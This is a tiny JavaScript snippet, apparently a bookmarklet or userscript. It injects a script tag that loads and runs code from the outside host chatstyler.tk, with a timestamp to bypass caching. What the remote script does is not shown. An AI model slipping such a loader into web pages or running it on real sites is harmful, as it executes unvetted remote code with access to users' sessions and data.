(()=>{
    const scripttag = document.createElement("script");
    scripttag.src=`//chatstyler.tk/script.js?${Date.now()}`
    document.body.appendChild(scripttag)
})()

